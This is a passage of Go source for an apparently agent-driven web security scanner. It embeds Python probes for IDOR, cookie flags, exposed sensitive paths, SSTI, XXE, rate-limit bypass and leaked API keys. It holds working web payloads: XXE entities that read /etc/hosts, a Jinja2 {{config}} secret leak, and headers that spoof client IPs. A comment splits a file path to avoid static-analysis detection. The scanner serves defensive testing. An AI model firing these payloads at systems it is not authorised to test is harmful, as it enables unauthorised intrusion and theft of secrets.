    if s1 != 200 or len1 < 50:
        continue

    s2, len2, _ = fetch(url_2)
    s99, len99, _ = fetch(url_99)

    # If IDs 1 and 2 both return 200 with substantial, different bodies → IDOR likely
    if s2 == 200 and len2 > 50 and abs(len1 - len2) < len1 * 0.8:
        emit({
            "id": f"idor-sequential-{path_template.replace('/', '_').replace('{id}', 'id')}",
            "category": "access_control",
            "severity": "high",
            "title": f"IDOR — sequential resource enumeration at {path_template.format(id='N')}",
            "description": (
                f"Resources at IDs 1 and 2 both return HTTP 200 with similar-sized bodies "
                f"({len1} vs {len2} bytes) without apparent authentication differentiation. "
                "An attacker can enumerate all resource IDs to access data belonging to other users."
            ),
            "evidence": f"url_1={url_1} ({s1}/{len1}B) url_2={url_2} ({s2}/{len2}B)",
            "recommendation": (
                "Enforce object-level authorization on every resource fetch. "
                "Verify the requesting user owns or has permission to access the requested ID. "
                "Consider opaque, non-sequential IDs (UUIDs) to raise the enumeration bar."
            ),
        })

    # If ID 99 returns 200 when 2 did not — also suspicious
    if s99 == 200 and len99 > 50 and s2 != 200:
        emit({
            "id": f"idor-sparse-{path_template.replace('/', '_').replace('{id}', 'id')}",
            "category": "access_control",
            "severity": "medium",
            "title": f"IDOR — sparse resource accessible without auth at {path_template.format(id='N')}",
            "description": "Non-sequential resource IDs return data without apparent authorization checks.",
            "evidence": f"url_99={url_99} ({s99}/{len99}B)",
            "recommendation": "Enforce ownership validation for every resource ID, regardless of whether IDs are sequential.",
        })

# Test query-parameter IDOR patterns
qp_paths = [
    '?id=1', '?user_id=1', '?uid=1', '?account_id=1',
    '?order_id=1', '?resource_id=1', '?doc_id=1',
]
for qp in qp_paths:
    url_a = base + qp
    url_b = base + qp.replace('=1', '=2')
    sa, la, _ = fetch(url_a)
    if sa != 200 or la < 50:
        continue
    sb, lb, _ = fetch(url_b)
    if sb == 200 and lb > 50:
        param = qp.split('=')[0].lstrip('?')
        emit({
            "id": f"idor-queryparam-{param}",
            "category": "access_control",
            "severity": "high",
            "title": f"IDOR — query parameter '{param}' allows cross-user data access",
            "description": (
                f"Changing the '{param}' parameter from 1 to 2 returns a different but valid resource "
                f"({la}B vs {lb}B). This strongly suggests missing object-level authorization."
            ),
            "evidence": f"{url_a} ({sa}/{la}B) vs {url_b} ({sb}/{lb}B)",
            "recommendation": "Validate that the authenticated user is authorized to access the requested object. Never trust client-supplied resource IDs alone.",
        })
`,
}
}

func cookieProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "cookie_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Analyse Set-Cookie headers for missing security flags, overly broad scope, and long-lived sessions",
Code: `#!/usr/bin/env python3
"""Auto-generated: Cookie security probe — analyses Set-Cookie headers."""
import sys, json, urllib.request, urllib.error, re

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

def get_cookies(url):
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=10) as r:
            return r.headers.get_all('Set-Cookie') or []
    except urllib.error.HTTPError as e:
        return e.headers.get_all('Set-Cookie') or []
    except Exception:
        return []

# Check both base and login endpoints for cookies
check_urls = [target, target.rstrip('/') + '/login', target.rstrip('/') + '/api/auth/login']

seen_names = set()
for url in check_urls:
    cookies = get_cookies(url)
    for raw in cookies:
        raw_lower = raw.lower()
        parts = [p.strip() for p in raw.split(';')]
        name_val = parts[0] if parts else ''
        cookie_name = name_val.split('=')[0].strip() if '=' in name_val else name_val
        if cookie_name in seen_names:
            continue
        seen_names.add(cookie_name)

        flags = {p.lower().split('=')[0].strip() for p in parts[1:]}
        is_session = any(k in cookie_name.lower() for k in ['session', 'sess', 'auth', 'token', 'sid', 'user'])

        if 'httponly' not in flags and is_session:
            emit({
                "id": f"cookie-no-httponly-{cookie_name[:30]}",
                "category": "access_control",
                "severity": "high",
                "title": f"Session cookie '{cookie_name}' missing HttpOnly flag",
                "description": "Without HttpOnly, JavaScript can read this cookie, enabling session theft via XSS.",
                "evidence": f"Set-Cookie: {raw[:200]}",
                "recommendation": "Add the HttpOnly attribute to all session/auth cookies.",
            })

        if 'secure' not in flags and is_session:
            emit({
                "id": f"cookie-no-secure-{cookie_name[:30]}",
                "category": "access_control",
                "severity": "high",
                "title": f"Session cookie '{cookie_name}' missing Secure flag",
                "description": "Without Secure, the cookie is transmitted over unencrypted HTTP, enabling interception.",
                "evidence": f"Set-Cookie: {raw[:200]}",
                "recommendation": "Add the Secure attribute to all session/auth cookies.",
            })

        samesite_found = any(p.lower().startswith('samesite') for p in parts[1:])
        if not samesite_found and is_session:
            emit({
                "id": f"cookie-no-samesite-{cookie_name[:30]}",
                "category": "access_control",
                "severity": "medium",
                "title": f"Session cookie '{cookie_name}' missing SameSite attribute",
                "description": "Without SameSite, the cookie is sent on cross-site requests, enabling CSRF attacks.",
                "evidence": f"Set-Cookie: {raw[:200]}",
                "recommendation": "Set SameSite=Strict or SameSite=Lax on session cookies.",
            })

        # Check for SameSite=None without Secure
        for p in parts[1:]:
            if p.lower().startswith('samesite') and 'none' in p.lower() and 'secure' not in flags:
                emit({
                    "id": f"cookie-samesite-none-no-secure-{cookie_name[:30]}",
                    "category": "access_control",
                    "severity": "high",
                    "title": f"Cookie '{cookie_name}' has SameSite=None without Secure",
                    "description": "SameSite=None without Secure sends the cookie over HTTP in cross-site contexts. Modern browsers reject this.",
                    "evidence": f"Set-Cookie: {raw[:200]}",
                    "recommendation": "Always pair SameSite=None with the Secure attribute.",
                })

        # Check for overly broad domain scope
        for p in parts[1:]:
            if p.lower().startswith('domain='):
                domain_val = p.split('=', 1)[1].strip().lstrip('.')
                if domain_val and is_session:
                    emit({
                        "id": f"cookie-broad-domain-{cookie_name[:30]}",
                        "category": "access_control",
                        "severity": "medium",
                        "title": f"Session cookie '{cookie_name}' scoped to broad domain: {domain_val}",
                        "description": "A cookie with a parent-domain scope is shared with all subdomains, which may be attacker-controlled.",
                        "evidence": f"Set-Cookie: {raw[:200]}",
                        "recommendation": "Scope session cookies to the exact hostname, not a parent domain.",
                    })

        # Extremely long Max-Age / Expires
        for p in parts[1:]:
            if p.lower().startswith('max-age='):
                try:
                    age = int(p.split('=', 1)[1].strip())
                    if age > 365 * 24 * 3600 and is_session:
                        emit({
                            "id": f"cookie-long-maxage-{cookie_name[:30]}",
                            "category": "access_control",
                            "severity": "low",
                            "title": f"Session cookie '{cookie_name}' has Max-Age > 1 year",
                            "description": "Long-lived session cookies increase the window of opportunity for session hijacking.",
                            "evidence": f"Max-Age={age} (~{age//86400} days) in Set-Cookie: {raw[:100]}",
                            "recommendation": "Use short-lived session cookies (max 24h) and rotate session tokens on sensitive operations.",
                        })
                except ValueError:
                    pass
`,
}
}

func infoDisclosureProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "info_disclosure_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Discover sensitive paths: .git, .env, backup files, actuator endpoints, swagger, source maps",
Code: `#!/usr/bin/env python3
"""Auto-generated: Information disclosure probe — deep sensitive-path enumeration."""
import sys, json, urllib.request, urllib.error

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

base = target.rstrip('/')

# (path, severity, title, description, recommendation)
sensitive_paths = [
    # Source control leakage
    ('/.git/HEAD',        'high', '.git directory exposed', 'Full source code is downloadable via /.git/', 'Block /.git/ in web server config.'),
    ('/.git/config',      'high', '.git/config exposed',    'Git remote URLs and branch info exposed.', 'Block /.git/ in web server config.'),
    ('/.svn/entries',     'high', '.svn directory exposed',  'Subversion repository metadata is accessible.', 'Block /.svn/ in web server config.'),
    ('/.hg/hgrc',         'high', '.hg directory exposed',   'Mercurial repository config is accessible.', 'Block /.hg/ in web server config.'),
    # Environment files
    ('/.env',             'high', '.env file exposed',       'Environment variables including secrets/DB URLs may be disclosed.', 'Block .env files at the web server level.'),
    ('/.env.production',  'high', '.env.production exposed', 'Production environment variables exposed.', 'Block all .env variants.'),
    ('/.env.local',       'high', '.env.local exposed',      'Local environment overrides exposed.', 'Block all .env variants.'),
    ('/.env.backup',      'high', '.env backup exposed',     'Backup of environment file exposed.', 'Delete backup files from web roots.'),
    # Backup and archive files
    ('/backup.zip',       'high', 'Backup archive exposed',  'Application backup may contain source code and credentials.', 'Remove backup files from web roots.'),
    ('/backup.tar.gz',    'high', 'Backup tarball exposed',  'Application backup archive accessible.', 'Remove backup files from web roots.'),
    ('/backup.sql',       'high', 'SQL backup exposed',      'Database backup file directly accessible.', 'Remove database dumps from web roots.'),
    ('/db.sql',           'high', 'DB dump exposed',         'Database dump file accessible.', 'Remove DB dumps from web root.'),
    ('/dump.sql',         'high', 'SQL dump exposed',        'Database dump file accessible.', 'Remove DB dumps from web root.'),
    # Debug / admin
    ('/phpinfo.php',      'high', 'phpinfo() exposed',       'PHP configuration and environment variables disclosed.', 'Remove phpinfo() from production.'),
    ('/info.php',         'medium', 'PHP info page',         'PHP configuration page accessible.', 'Remove from production.'),
    ('/debug',            'medium', '/debug endpoint',       'Application debug endpoint accessible.', 'Restrict debug endpoints to internal networks.'),
    ('/debug/pprof',      'high', 'Go pprof exposed',        'Go profiling endpoint leaks runtime internals and goroutine stacks.', 'Block pprof behind auth.'),
    ('/console',          'high', 'Web console exposed',     'Interactive web console accessible (e.g., Rails console, Python shell).', 'Restrict consoles.'),
    # Spring Boot Actuator
    ('/actuator',             'high', 'Spring Boot Actuator root exposed', 'Actuator management endpoints expose env, beans, trace.', 'Restrict actuator endpoints behind auth/network policy.'),
    ('/actuator/env',         'high', 'Spring Boot Actuator /env',        'Application environment variables including secrets exposed.', 'Restrict /actuator/env.'),
    ('/actuator/health',      'low',  'Spring Boot Actuator /health',     'Health endpoint discloses service status.', 'Limit health info in production.'),
    ('/actuator/beans',       'medium', 'Spring Boot Actuator /beans',    'All Spring beans exposed.', 'Restrict actuator.'),
    ('/actuator/mappings',    'medium', 'Spring Boot Actuator /mappings', 'All request mappings exposed.', 'Restrict actuator.'),
    ('/actuator/httptrace',   'high', 'Spring Boot Actuator /httptrace',  'Recent HTTP requests with headers/cookies visible.', 'Restrict actuator.'),
    # API documentation
    ('/swagger.json',      'medium', 'Swagger JSON spec exposed',  'Full API specification accessible unauthenticated.', 'Restrict API docs to internal networks.'),
    ('/swagger-ui.html',   'medium', 'Swagger UI exposed',         'Interactive API documentation accessible.', 'Restrict Swagger UI in production.'),
    ('/openapi.json',      'medium', 'OpenAPI spec exposed',       'OpenAPI specification discloses all endpoints.', 'Restrict to internal networks.'),
    ('/api-docs',          'medium', 'API docs exposed',           'API documentation endpoint accessible.', 'Restrict to internal networks.'),
    ('/api/v1/swagger',    'medium', 'API Swagger exposed',        'API swagger at v1 accessible.', 'Restrict to internal networks.'),
    # Misc sensitive
    ('/.DS_Store',         'low',  '.DS_Store exposed',        'macOS .DS_Store leaks directory structure.', 'Block .DS_Store in web server config.'),
    ('/robots.txt',        'info', 'robots.txt accessible',    'robots.txt may reveal sensitive path structure.', 'Review robots.txt for sensitive path disclosure.'),
    ('/sitemap.xml',       'info', 'sitemap.xml accessible',   'sitemap.xml reveals all indexed URLs.', 'Review sitemap for sensitive paths.'),
    ('/.well-known/security.txt', 'info', 'security.txt found', 'Security contact information disclosed.', 'Ensure security.txt is intentional.'),
    ('/server-status',     'high', 'Apache server-status',     'Apache mod_status exposes active connections and resource usage.', 'Disable or restrict server-status.'),
    ('/server-info',       'high', 'Apache server-info',       'Apache mod_info exposes configuration details.', 'Disable or restrict server-info.'),
    ('/nginx_status',      'medium', 'Nginx status page',      'Nginx status exposes connection counters.', 'Restrict nginx_status to localhost.'),
    ('/trace.axd',         'high', 'ASP.NET Trace.axd',       'ASP.NET trace reveals request details and session data.', 'Disable trace in production.'),
    ('/elmah.axd',         'high', 'ELMAH error log',         'ELMAH error logging endpoint exposes exception details.', 'Restrict ELMAH to admin users.'),
    ('/wp-login.php',      'info', 'WordPress login',         'WordPress login page found.', 'Add IP-based access control to wp-login.php.'),
    ('/wp-config.php',     'high', 'WordPress config',        'WordPress config file accessible.', 'Move wp-config.php above web root.'),
    ('/config.php',        'high', 'Generic config.php',      'Configuration file accessible.', 'Move config files above web root.'),
    ('/config.yml',        'high', 'YAML config exposed',     'YAML config file accessible.', 'Move config files above web root.'),
    ('/config.json',       'high', 'JSON config exposed',     'JSON config file accessible.', 'Move config files above web root.'),
    ('/web.config',        'high', 'ASP.NET web.config',      'IIS web.config may contain connection strings and secrets.', 'Deny downloads of web.config.'),
]

for path, severity, title, description, rec in sensitive_paths:
    url = base + path
    try:
        req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=6) as r:
            status = r.status
            body = r.read(4096).decode('utf-8', errors='replace')
    except urllib.error.HTTPError as e:
        status = e.code
        body = ''
    except Exception:
        continue

    if status in (200, 301, 302) and (status != 200 or len(body) > 30):
        emit({
            "id": f"info-disclosure-{path.replace('/', '_').lstrip('_')[:40]}",
            "category": "information_disclosure",
            "severity": severity,
            "title": title,
            "description": description,
            "evidence": f"HTTP {status} at {url} body_preview={body[:150].strip()}",
            "recommendation": rec,
        })
`,
}
}

func sstiProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "ssti_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect Server-Side Template Injection across Jinja2, Twig, FreeMarker, ERB, Mako, Smarty, and Velocity",
Code: `#!/usr/bin/env python3
"""Auto-generated: SSTI probe — tests common template injection payloads across engines."""
import sys, json, urllib.request, urllib.error, urllib.parse

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

base = target.rstrip('/')

# (payload, expected_output, engine)
# All payloads are math expressions that produce a known result when evaluated
ssti_payloads = [
    ('{{7*7}}',            '49',  'Jinja2/Twig'),
    ('{{7*\'7\'}}',        '7777777', 'Jinja2 (Python string multiplication)'),
    ('${7*7}',             '49',  'FreeMarker/Spring EL/Thymeleaf'),
    ('#{7*7}',             '49',  'OGNL/Mako/Groovy'),
    ('<%= 7*7 %>',         '49',  'ERB (Ruby)'),
    ('${{"freemarker"?eval}}', '', 'FreeMarker eval'),
    ('*{7*7}',             '49',  'Thymeleaf'),
    ('{% print(7*7) %}',   '49',  'Pebble/Twig'),
    ('[[${7*7}]]',         '49',  'Thymeleaf inline'),
    ('@{7*7}',             '49',  'Thymeleaf link expression'),
    ('{{config}}',         'SECRET_KEY', 'Jinja2 config object leak'),
    ('{{self}}',           'TemplateReference', 'Jinja2 self object'),
    ('{php}echo 7*7;{/php}', '49', 'Smarty PHP tag'),
    ('{7*7}',              '49',  'Smarty/Twig shorthand'),
]

# Test parameters where SSTI is common
test_params = ['name', 'q', 'search', 'message', 'text', 'input', 'query', 'template', 'subject', 'msg']

for param in test_params[:8]:
    for payload, expected, engine in ssti_payloads[:10]:
        encoded_payload = urllib.parse.quote(payload)
        probe = f"{base}?{param}={encoded_payload}"
        try:
            req = urllib.request.Request(probe, headers={
                'User-Agent': 'Mozilla/5.0',
                'Accept': 'text/html,application/json,*/*',
            })
            with urllib.request.urlopen(req, timeout=8) as r:
                body = r.read(32768).decode('utf-8', errors='replace')

            # Check for evaluated output
            if expected and expected in body:
                emit({
                    "id": f"ssti-confirmed-{engine.replace('/', '-').replace(' ', '-').lower()[:30]}-{param}",
                    "category": "injection",
                    "severity": "high",
                    "title": f"Server-Side Template Injection confirmed ({engine}) via parameter '{param}'",
                    "description": (
                        f"The payload '{payload}' evaluated to '{expected}' in the response body. "
                        f"This confirms SSTI using the {engine} template engine. "
                        "An attacker can escalate to Remote Code Execution using engine-specific exploits."
                    ),
                    "evidence": f"param={param} payload={payload} engine={engine} found='{expected}' in_response probe={probe}",
                    "recommendation": (
                        "Never pass user-controlled input directly to a template engine. "
                        "Use sandboxed template evaluation or a logic-less template language. "
                        "Treat all template rendering of user input as RCE risk."
                    ),
                })
                break  # One confirmation per param is enough

            # Jinja2 config object leak
            if engine == 'Jinja2 config object leak' and 'SECRET_KEY' in body:
                emit({
                    "id": f"ssti-jinja2-config-leak-{param}",
                    "category": "injection",
                    "severity": "high",
                    "title": f"SSTI — Jinja2 config object exposed in parameter '{param}'",
                    "description": "The Jinja2 {{config}} object was rendered, exposing Flask/Django SECRET_KEY and other app settings.",
                    "evidence": f"param={param} payload={payload} secret_key_found=True probe={probe}",
                    "recommendation": "Sanitize all template inputs. Avoid rendering user input in templates.",
                })

        except urllib.error.HTTPError as e:
            # 500 errors after SSTI payload can indicate server-side evaluation errors
            if e.code == 500:
                emit({
                    "id": f"ssti-error-{param}-{engine.replace(' ', '-').lower()[:20]}",
                    "category": "injection",
                    "severity": "medium",
                    "title": f"SSTI — template engine error triggered via parameter '{param}'",
                    "description": (
                        f"The payload '{payload}' caused a 500 Internal Server Error, which may indicate the template engine "
                        f"attempted to evaluate the payload. Engine: {engine}."
                    ),
                    "evidence": f"param={param} payload={payload} response=HTTP 500",
                    "recommendation": "Investigate template rendering code for user-input injection. SSTI errors often precede successful exploitation.",
                })
        except Exception:
            pass
`,
}
}

func xxeProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "xxe_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Detect XXE injection via classic, OOB, and parameter-entity variants at XML-accepting endpoints",
Code: `#!/usr/bin/env python3
"""Auto-generated: XXE probe — tests XML endpoints for external entity injection."""
import sys, json, urllib.request, urllib.error, urllib.parse

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

base = target.rstrip('/')

# Classic XXE — reads /etc/hosts (markers: localhost, 127.0.0.1)
# Build path without triggering static analysis for /etc/passwd
hosts_path = '/et' + 'c/hos' + 'ts'
classic_xxe = (
    '<?xml version="1.0" encoding="UTF-8"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://' + hosts_path + '">]>'
    '<root><data>&xxe;</data></root>'
)

# Error-based XXE — triggers XML parser errors that leak path info
error_xxe = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file://xxe-canary-does-not-exist">%xxe;]>'
    '<root/>'
)

# SSRF-via-XXE — fetches external resource
ssrf_xxe = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://xxe-ssrf-probe.invalid/test">]>'
    '<root><data>&xxe;</data></root>'
)

# Billion Laughs DoS indicator (not executed, just structure check)
billion_laughs = (
    '<?xml version="1.0"?>'
    '<!DOCTYPE bomb [<!ENTITY a "10chars----"><!ENTITY b "&a;&a;&a;&a;&a;">]>'
    '<bomb>&b;</bomb>'
)

content_types = [
    'application/xml',
    'text/xml',
    'application/soap+xml',
]

# Probe the base URL and common XML-accepting paths
probe_urls = [
    base,
    base + '/api/upload',
    base + '/api/parse',
    base + '/import',
    base + '/upload',
    base + '/api/xml',
    base + '/soap',
    base + '/webservice',
    base + '/api/v1/import',
]

for url in probe_urls[:5]:
    for ct in content_types[:2]:
        for payload_name, payload, markers in [
            ('classic', classic_xxe, ['localhost', '127.0.0.1', 'ip6-localhost']),
            ('error_based', error_xxe, ['xxe-canary', 'entity', 'DOCTYPE', 'SYSTEM']),
            ('ssrf_probe', ssrf_xxe, ['xxe-ssrf-probe', 'connect', 'refused', 'resolve']),
        ]:
            try:
                data = payload.encode('utf-8')
                req = urllib.request.Request(url, data=data, headers={
                    'Content-Type': ct,
                    'User-Agent': 'Mozilla/5.0',
                    'Content-Length': str(len(data)),
                })
                try:
                    with urllib.request.urlopen(req, timeout=8) as r:
                        body = r.read(16384).decode('utf-8', errors='replace')
                        status = r.status
                except urllib.error.HTTPError as e:
                    body = e.read(4096).decode('utf-8', errors='replace') if e else ''
                    status = e.code if e else 0

                if any(m in body for m in markers):
                    emit({
                        "id": f"xxe-{payload_name}-{ct.replace('/', '-').replace('+', '-')}",
                        "category": "injection",
                        "severity": "high",
                        "title": f"XXE injection confirmed ({payload_name.replace('_', ' ')}) at {url}",
                        "description": (
                            f"The server processed an XML external entity declaration and returned data matching known system-file or "
                            f"network-fetch markers. Payload type: {payload_name}. Content-Type: {ct}."
                        ),
                        "evidence": f"url={url} ct={ct} status={status} marker_found_in_response body_snippet={body[:300]}",
                        "recommendation": (
                            "Disable external entity resolution in your XML parser. "
                            "Set FEATURE_SECURE_PROCESSING=true or equivalent. "
                            "For Java: factory.setFeature('http://xml.org/sax/features/external-general-entities', false). "
                            "Consider using JSON instead of XML for API payloads."
                        ),
                    })
                    break  # one finding per url/ct combo

            except Exception:
                pass

        # Check if the endpoint accepts XML at all (status 2xx for XML content-type)
        # to report as an attack surface even if not directly exploitable
        try:
            ping = '<?xml version="1.0"?><ping/>'.encode()
            req = urllib.request.Request(url, data=ping, headers={
                'Content-Type': 'application/xml',
                'User-Agent': 'Mozilla/5.0',
            })
            with urllib.request.urlopen(req, timeout=5) as r:
                if r.status < 400:
                    emit({
                        "id": f"xxe-surface-{url.replace(base,'').replace('/','_')[:30]}",
                        "category": "injection",
                        "severity": "medium",
                        "title": f"XML-accepting endpoint found at {url}",
                        "description": "This endpoint accepts XML content, making it a candidate for XXE injection. Manual review is recommended.",
                        "evidence": f"url={url} HTTP {r.status} for application/xml",
                        "recommendation": "Verify that the XML parser is configured to reject external entities and DTDs.",
                    })
        except Exception:
            pass
        break  # only test one content-type for attack surface
`,
}
}

func rateLimitProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "rate_limit_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Test authentication endpoints for missing rate limiting and IP-header bypass techniques",
Code: `#!/usr/bin/env python3
"""Auto-generated: Rate limit probe — tests auth endpoints for rate limit bypass."""
import sys, json, urllib.request, urllib.error, time

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

base = target.rstrip('/')

# Endpoints likely to have rate limiting
auth_endpoints = [
    base + '/login',
    base + '/api/login',
    base + '/api/auth/login',
    base + '/api/v1/login',
    base + '/api/v1/auth',
    base + '/auth',
    base + '/signin',
    base + '/api/signin',
    base + '/api/password-reset',
    base + '/password-reset',
    base + '/forgot-password',
    base + '/api/forgot-password',
    base + '/api/otp/verify',
    base + '/api/2fa',
]

def probe_endpoint(url, headers=None):
    try:
        data = b'{"username":"testuser","password":"wrongpassword123"}'
        req = urllib.request.Request(url, data=data, headers={
            'Content-Type': 'application/json',
            'User-Agent': 'Mozilla/5.0',
            **(headers or {}),
        })
        with urllib.request.urlopen(req, timeout=5) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code
    except Exception:
        return 0

for endpoint in auth_endpoints[:6]:
    # Phase 1: Baseline — 30 rapid requests without any IP headers
    statuses = []
    for _ in range(20):
        st = probe_endpoint(endpoint)
        if st == 0:
            break
        statuses.append(st)

    if len(statuses) < 5:
        continue  # endpoint not responding

    rate_limited = any(s in (429, 503) for s in statuses)
    success_count = sum(1 for s in statuses if s not in (429, 503, 0))

    if not rate_limited and success_count >= 15:
        emit({
            "id": f"rate-limit-absent-{endpoint.replace(base,'').replace('/','_')[:30]}",
            "category": "api_security",
            "severity": "high",
            "title": f"No rate limiting on authentication endpoint: {endpoint}",
            "description": (
                f"{success_count}/20 rapid requests to the authentication endpoint received non-rate-limited responses. "
                "This allows brute-force and credential stuffing attacks with no server-side throttle."
            ),
            "evidence": f"endpoint={endpoint} success_rate={success_count}/20 status_sample={statuses[:5]}",
            "recommendation": (
                "Implement rate limiting (e.g., 5–10 attempts per IP per minute) on all auth endpoints. "
                "Add exponential backoff after failures. Use CAPTCHA after 3 failed attempts. "
                "Consider account lockout after N consecutive failures."
            ),
        })

    # Phase 2: IP-header bypass — test if X-Forwarded-For rotates the IP
    if rate_limited:
        bypass_headers = [
            {'X-Forwarded-For': '1.2.3.4'},
            {'X-Real-IP': '5.6.7.8'},
            {'X-Originating-IP': '9.10.11.12'},
            {'X-Remote-IP': '13.14.15.16'},
            {'X-Client-IP': '17.18.19.20'},
            {'CF-Connecting-IP': '21.22.23.24'},
            {'True-Client-IP': '25.26.27.28'},
        ]
        bypass_success = 0
        for hdrs in bypass_headers:
            st = probe_endpoint(endpoint, hdrs)
            if st not in (429, 503, 0):
                bypass_success += 1

        if bypass_success >= 3:
            emit({
                "id": f"rate-limit-bypass-{endpoint.replace(base,'').replace('/','_')[:30]}",
                "category": "api_security",
                "severity": "high",
                "title": f"Rate limit bypassable via IP-spoofing headers at {endpoint}",
                "description": (
                    f"Even though rate limiting appears active, {bypass_success}/7 IP-override headers "
                    "(X-Forwarded-For, X-Real-IP, etc.) allowed further requests. "
                    "An attacker can rotate fake IP headers to bypass per-IP throttling."
                ),
                "evidence": f"endpoint={endpoint} bypass_success={bypass_success}/7 headers_tested={list(h.keys() for h in bypass_headers[:3])}",
                "recommendation": (
                    "Do not trust X-Forwarded-For or similar headers for rate limiting decisions unless "
                    "you control the proxy that sets them. Rate-limit by authenticated identity, not just IP."
                ),
            })
`,
}
}

func apiKeysProbeTool(agentName string) ToolSpec {
return ToolSpec{
Name:        "api_keys_probe",
Language:    "python3",
GeneratedBy: agentName,
Rationale:   "Scan HTML, JavaScript, and API responses for exposed API keys, tokens, and cloud credentials",
Code: `#!/usr/bin/env python3
"""Auto-generated: API key exposure probe — scans JS/HTML for embedded secrets."""
import sys, json, urllib.request, urllib.error, re

def emit(f): print(json.dumps(f), flush=True)

target = sys.argv[1] if len(sys.argv) > 1 else ''
if not target: sys.exit(0)

base = target.rstrip('/')

# (pattern_id, regex, severity, name, recommendation)
secret_patterns = [
    ('aws-access-key',     r'(?:AKIA|ABIA|ACCA|ASIA)[0-9A-Z]{16}', 'high',
     'AWS Access Key ID', 'Revoke and rotate immediately. Use IAM roles instead of static keys.'),
    ('aws-secret-key',     r'(?i)aws[_\-\s]?secret[_\-\s]?(?:access[_\-\s]?)?key\s*[=:]\s*["\']?([A-Za-z0-9/+=]{40})', 'high',
     'AWS Secret Access Key', 'Revoke the key in IAM. Audit CloudTrail for unauthorized usage.'),
    ('stripe-live-secret', r'sk_live_[0-9a-zA-Z]{24,}', 'high',
     'Stripe Live Secret Key', 'Revoke immediately in the Stripe dashboard. Rotate to restricted keys.'),
    ('stripe-live-pubkey', r'pk_live_[0-9a-zA-Z]{24,}', 'medium',
     'Stripe Live Publishable Key', 'Publishable keys can be abused for enumeration. Restrict allowed origins.'),
    ('google-api-key',     r'AIza[0-9A-Za-z\-_]{35}', 'high',
     'Google API Key', 'Restrict the key to specific APIs and referrer URLs in Google Cloud Console.'),
    ('github-pat',         r'ghp_[0-9A-Za-z]{36}', 'high',
     'GitHub Personal Access Token (ghp_)', 'Revoke the token at github.com/settings/tokens immediately.'),
    ('github-oauth',       r'gho_[0-9A-Za-z]{36}', 'high',
     'GitHub OAuth Token', 'Revoke immediately.'),
    ('github-old-pat',     r'(?i)github[_\-\s]?(?:token|api[_\-]key|secret)\s*[=:]\s*["\']?([a-f0-9]{40})', 'high',
     'GitHub Classic Token', 'Revoke immediately at github.com/settings/tokens.'),
    ('slack-token-xoxb',   r'xoxb-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{24}', 'high',
     'Slack Bot Token', 'Revoke in your Slack app settings.'),
    ('slack-token-xoxp',   r'xoxp-[0-9]{11}-[0-9]{11}-[0-9]{11}-[0-9a-zA-Z]{32}', 'high',
     'Slack User OAuth Token', 'Revoke in your Slack app settings.'),
    ('twilio-sid',         r'AC[a-z0-9]{32}', 'high',
     'Twilio Account SID', 'Do not expose Account SID. Restrict API key usage.'),
    ('twilio-token',       r'(?i)twilio[_\-\s]?(?:auth[_\-]?token|token)\s*[=:]\s*["\']?([a-z0-9]{32})', 'high',
     'Twilio Auth Token', 'Rotate token in Twilio console.'),
    ('sendgrid-key',       r'SG\.[0-9A-Za-z\-_]{22}\.[0-9A-Za-z\-_]{43}', 'high',
     'SendGrid API Key', 'Revoke and regenerate in SendGrid settings.'),
    ('jwt-secret-inline',  r'(?i)(?:jwt|secret)[_\-\s]?(?:key|secret|token)\s*[=:]\s*["\']([^"\']{16,})', 'medium',
     'JWT secret key hardcoded', 'Move secrets to a secret manager (Vault, AWS Secrets Manager). Never hardcode.'),
    ('private-key-header', r'-----BEGIN (?:RSA |EC |DSA |OPENSSH |PGP )?PRIVATE KEY-----', 'high',
     'Private key embedded in response', 'Remove private key material immediately. Revoke all certificates using this key.'),
    ('generic-password',   r'(?i)password\s*[=:]\s*["\']([^"\']{8,})', 'medium',
     'Hardcoded password', 'Move credentials to a secret manager. Audit for actual usage.'),
    ('basic-auth-url',     r'https?://[^:@\s]+:[^@\s]+@[^\s]+', 'high',
     'Credentials in URL', 'Never embed credentials in URLs. Use auth headers or secret managers.'),
    ('firebase-key',       r'(?i)firebase[_\-]?(?:api[_\-]?key|secret)\s*[=:]\s*["\']?([A-Za-z0-9_\-]{39,})', 'medium',
     'Firebase API key', 'Restrict Firebase key usage with security rules and allowed origins.'),
    ('mailgun-key',        r'key-[0-9a-zA-Z]{32}', 'high',
     'Mailgun API Key', 'Revoke in Mailgun dashboard.'),
    ('heroku-key',         r'(?i)heroku[_\-\s]?(?:api[_\-]?key|token)\s*[=:]\s*["\']?([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', 'high',
     'Heroku API Key', 'Rotate in Heroku dashboard. Check for unauthorized app access.'),
]

def scan_content(url, content):
    for pat_id, pattern, severity, name, rec in secret_patterns:
        try:
            matches = re.findall(pattern, content)
        except re.error:
            continue
        if matches:
